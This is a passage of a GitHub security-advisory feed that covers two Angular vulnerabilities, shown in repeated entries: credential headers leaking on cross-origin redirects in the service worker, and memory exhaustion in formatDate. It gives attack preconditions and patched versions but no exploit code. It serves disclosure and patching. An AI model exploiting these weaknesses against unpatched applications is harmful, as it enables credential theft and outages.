<li><a href="https://github.com/angular/angular/pull/69029">https://github.com/angular/angular/pull/69029</a></li>
<li><a href="https://github.com/angular/angular/commit/47d68dcb26266316647133ab6385e77fc3e5ae08">https://github.com/angular/angular/commit/47d68dcb26266316647133ab6385e77fc3e5ae08</a></li>
<li><a href="https://github.com/advisories/GHSA-qxh6-94w6-9r5p">https://github.com/advisories/GHSA-qxh6-94w6-9r5p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qxh6-94w6-9r5p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-15T17:25:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/service-worker] @angular/service-worker: Sensitive Header Leakage on Cross-Origin Redirects in Angular Service Worker]]></title>
        <id>https://github.com/advisories/GHSA-qxh6-94w6-9r5p</id>
        <link href="https://github.com/advisories/GHSA-qxh6-94w6-9r5p"/>
        <updated>2026-06-15T17:25:55.000Z</updated>
        <content type="html"><![CDATA[<p>An information disclosure vulnerability exists in the <code>@angular/service-worker</code> package of the Angular framework. When the Service Worker fetches assets, it preserves metadata (such as headers) from the original request. However, on cross-origin redirects, the Service Worker fails to strip sensitive headers, violating the Fetch redirect algorithm. </p>
<p>This allows a remote attacker to obtain sensitive credentials (e.g., <code>Authorization</code> tokens, <code>Proxy-Authorization</code> credentials, or session cookies) by triggering a cross-origin redirect to an untrusted external origin.</p>
<h3 id="impact">Impact</h3>
<p>If an application configured with the Angular Service Worker fetches assets with credential headers (such as <code>Authorization</code> header), and one of those requests is redirected to a different origin, the Service Worker will forward those headers to the new origin. This exposes critical credentials and session identifiers to unauthorized third-party servers.</p>
<h3 id="attack-preconditions">Attack Preconditions</h3>
<p>For this vulnerability to be exploitable:</p>
<ol>
<li><strong>Vulnerable Configuration:</strong> The application must utilize the <code>@angular/service-worker</code> package to fetch assets.</li>
<li><strong>Credentialed Requests:</strong> The application must attach sensitive request headers (like <code>Authorization</code>, <code>Proxy-Authorization</code>, or rely on cookies) to asset-group requests.</li>
<li><strong>Redirect Flow:</strong> These requests must encounter a cross-origin redirect to an attacker-controlled or untrusted domain.</li>
</ol>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.1  </li>
<li>21.2.17  </li>
<li>20.3.25</li>
</ul>
<h3 id="credits">Credits</h3>
<p>This vulnerability was discovered and reported by <a href="https://deepmind.google/blog/introducing-codemender-an-ai-agent-for-code-security/">CodeMender from Google DeepMind</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-qxh6-94w6-9r5p">https://github.com/angular/angular/security/advisories/GHSA-qxh6-94w6-9r5p</a></li>
<li><a href="https://github.com/angular/angular/pull/69029">https://github.com/angular/angular/pull/69029</a></li>
<li><a href="https://github.com/angular/angular/commit/47d68dcb26266316647133ab6385e77fc3e5ae08">https://github.com/angular/angular/commit/47d68dcb26266316647133ab6385e77fc3e5ae08</a></li>
<li><a href="https://github.com/advisories/GHSA-qxh6-94w6-9r5p">https://github.com/advisories/GHSA-qxh6-94w6-9r5p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qxh6-94w6-9r5p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-15T17:25:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/common] @angular/common: Denial of Service (DoS) via OOM in Date Formatting (formatDate)]]></title>
        <id>https://github.com/advisories/GHSA-48r7-hpm6-gfxm</id>
        <link href="https://github.com/advisories/GHSA-48r7-hpm6-gfxm"/>
        <updated>2026-06-15T17:24:52.000Z</updated>
        <content type="html"><![CDATA[<p>A Denial of Service (DoS) vulnerability exists in the <code>@angular/common</code> package of the Angular framework. The <code>formatDate</code> function, which is also utilized by the standard Angular <code>DatePipe</code>, does not properly limit or validate the length of the <code>format</code> parameter. </p>
<p>When parsing a maliciously crafted, excessively long date format string (e.g., a repeating pattern or very large string), the internal parser splits the string iteratively using a regular expression loop. This results in uncontrolled resource consumption (high CPU utilization and excessive memory allocations), leading to a Denial of Service (DoS).</p>
<h3 id="impact">Impact</h3>
<h4 id="1-server-side-rendering-ssr">1. Server-Side Rendering (SSR)</h4>
<p>In Angular applications that leverage Server-Side Rendering, an attacker can supply a malicious payload with an excessively long date format string. Processing this on the server causes high CPU usage and triggers a <code>JavaScript heap out of memory</code> crash, rendering the application unavailable to all users.</p>
<h4 id="2-client-side-rendering-csr">2. Client-Side Rendering (CSR)</h4>
<p>In standard client-side applications, executing the vulnerable function with an excessively long format string blocks the browser's main thread, causing the browser tab to freeze and become completely unresponsive.</p>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.1  </li>
<li>21.2.17  </li>
<li>20.3.25</li>
</ul>
<h3 id="attack-preconditions">Attack Preconditions</h3>
<p>For this vulnerability to be exploitable, both of the following conditions must be met:</p>
<ol>
<li><strong>Vulnerable Component Usage:</strong> The application must format dates using the <code>formatDate</code> utility or the <code>DatePipe</code>.</li>
<li><strong>Attacker-Controlled Parameter:</strong> The date format string passed to these utilities must be customizable or directly controlled by untrusted user input (e.g., parsed from query parameters, user preferences, or API responses).</li>
</ol>
<p><em>If the date format is hardcoded (e.g., <code>'mediumDate'</code>, <code>'shortTime'</code>, or static strings) or properly validated to be within a reasonable length limit, the application is not vulnerable.</em></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-48r7-hpm6-gfxm">https://github.com/angular/angular/security/advisories/GHSA-48r7-hpm6-gfxm</a></li>
<li><a href="https://github.com/angular/angular/pull/69197">https://github.com/angular/angular/pull/69197</a></li>
<li><a href="https://github.com/angular/angular/commit/eeb03f4ea310e2e51ba5d53a421ec7b418e186cd">https://github.com/angular/angular/commit/eeb03f4ea310e2e51ba5d53a421ec7b418e186cd</a></li>
<li><a href="https://github.com/advisories/GHSA-48r7-hpm6-gfxm">https://github.com/advisories/GHSA-48r7-hpm6-gfxm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-48r7-hpm6-gfxm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-15T17:24:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/common] @angular/common: Denial of Service (DoS) via OOM in Date Formatting (formatDate)]]></title>
        <id>https://github.com/advisories/GHSA-48r7-hpm6-gfxm</id>
        <link href="https://github.com/advisories/GHSA-48r7-hpm6-gfxm"/>
        <updated>2026-06-15T17:24:52.000Z</updated>
        <content type="html"><![CDATA[<p>A Denial of Service (DoS) vulnerability exists in the <code>@angular/common</code> package of the Angular framework. The <code>formatDate</code> function, which is also utilized by the standard Angular <code>DatePipe</code>, does not properly limit or validate the length of the <code>format</code> parameter. </p>
<p>When parsing a maliciously crafted, excessively long date format string (e.g., a repeating pattern or very large string), the internal parser splits the string iteratively using a regular expression loop. This results in uncontrolled resource consumption (high CPU utilization and excessive memory allocations), leading to a Denial of Service (DoS).</p>
<h3 id="impact">Impact</h3>
<h4 id="1-server-side-rendering-ssr">1. Server-Side Rendering (SSR)</h4>
<p>In Angular applications that leverage Server-Side Rendering, an attacker can supply a malicious payload with an excessively long date format string. Processing this on the server causes high CPU usage and triggers a <code>JavaScript heap out of memory</code> crash, rendering the application unavailable to all users.</p>
<h4 id="2-client-side-rendering-csr">2. Client-Side Rendering (CSR)</h4>
<p>In standard client-side applications, executing the vulnerable function with an excessively long format string blocks the browser's main thread, causing the browser tab to freeze and become completely unresponsive.</p>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.1  </li>
<li>21.2.17  </li>
<li>20.3.25</li>
</ul>
<h3 id="attack-preconditions">Attack Preconditions</h3>
<p>For this vulnerability to be exploitable, both of the following conditions must be met:</p>
<ol>
<li><strong>Vulnerable Component Usage:</strong> The application must format dates using the <code>formatDate</code> utility or the <code>DatePipe</code>.</li>
<li><strong>Attacker-Controlled Parameter:</strong> The date format string passed to these utilities must be customizable or directly controlled by untrusted user input (e.g., parsed from query parameters, user preferences, or API responses).</li>
</ol>
<p><em>If the date format is hardcoded (e.g., <code>'mediumDate'</code>, <code>'shortTime'</code>, or static strings) or properly validated to be within a reasonable length limit, the application is not vulnerable.</em></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-48r7-hpm6-gfxm">https://github.com/angular/angular/security/advisories/GHSA-48r7-hpm6-gfxm</a></li>
<li><a href="https://github.com/angular/angular/pull/69197">https://github.com/angular/angular/pull/69197</a></li>
<li><a href="https://github.com/angular/angular/commit/eeb03f4ea310e2e51ba5d53a421ec7b418e186cd">https://github.com/angular/angular/commit/eeb03f4ea310e2e51ba5d53a421ec7b418e186cd</a></li>
<li><a href="https://github.com/advisories/GHSA-48r7-hpm6-gfxm">https://github.com/advisories/GHSA-48r7-hpm6-gfxm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-48r7-hpm6-gfxm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-15T17:24:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/common] @angular/common: Denial of Service (DoS) via OOM in Date Formatting (formatDate)]]></title>
        <id>https://github.com/advisories/GHSA-48r7-hpm6-gfxm</id>
        <link href="https://github.com/advisories/GHSA-48r7-hpm6-gfxm"/>
        <updated>2026-06-15T17:24:52.000Z</updated>
        <content type="html"><![CDATA[<p>A Denial of Service (DoS) vulnerability exists in the <code>@angular/common</code> package of the Angular framework. The <code>formatDate</code> function, which is also utilized by the standard Angular <code>DatePipe</code>, does not properly limit or validate the length of the <code>format</code> parameter. </p>
<p>When parsing a maliciously crafted, excessively long date format string (e.g., a repeating pattern or very large string), the internal parser splits the string iteratively using a regular expression loop. This results in uncontrolled resource consumption (high CPU utilization and excessive memory allocations), leading to a Denial of Service (DoS).</p>
<h3 id="impact">Impact</h3>
<h4 id="1-server-side-rendering-ssr">1. Server-Side Rendering (SSR)</h4>
<p>In Angular applications that leverage Server-Side Rendering, an attacker can supply a malicious payload with an excessively long date format string. Processing this on the server causes high CPU usage and triggers a <code>JavaScript heap out of memory</code> crash, rendering the application unavailable to all users.</p>
<h4 id="2-client-side-rendering-csr">2. Client-Side Rendering (CSR)</h4>
<p>In standard client-side applications, executing the vulnerable function with an excessively long format string blocks the browser's main thread, causing the browser tab to freeze and become completely unresponsive.</p>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.1  </li>
<li>21.2.17  </li>
<li>20.3.25</li>
</ul>
<h3 id="attack-preconditions">Attack Preconditions</h3>
<p>For this vulnerability to be exploitable, both of the following conditions must be met:</p>
<ol>
<li><strong>Vulnerable Component Usage:</strong> The application must format dates using the <code>formatDate</code> utility or the <code>DatePipe</code>.</li>
<li><strong>Attacker-Controlled Parameter:</strong> The date format string passed to these utilities must be customizable or directly controlled by untrusted user input (e.g., parsed from query parameters, user preferences, or API responses).</li>
</ol>
<p><em>If the date format is hardcoded (e.g., <code>'mediumDate'</code>, <code>'shortTime'</code>, or static strings) or properly validated to be within a reasonable length limit, the application is not vulnerable.</em></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-48r7-hpm6-gfxm">https://github.com/angular/angular/security/advisories/GHSA-48r7-hpm6-gfxm</a></li>
<li><a href="https://github.com/angular/angular/pull/69197">https://github.com/angular/angular/pull/69197</a></li>
<li><a href="https://github.com/angular/angular/commit/eeb03f4ea310e2e51ba5d53a421ec7b418e186cd">https://github.com/angular/angular/commit/eeb03f4ea310e2e51ba5d53a421ec7b418e186cd</a></li>
<li><a href="https://github.com/advisories/GHSA-48r7-hpm6-gfxm">https://github.com/advisories/GHSA-48r7-hpm6-gfxm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-48r7-hpm6-gfxm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-15T17:24:52.000Z</published>
    </entry>
</feed>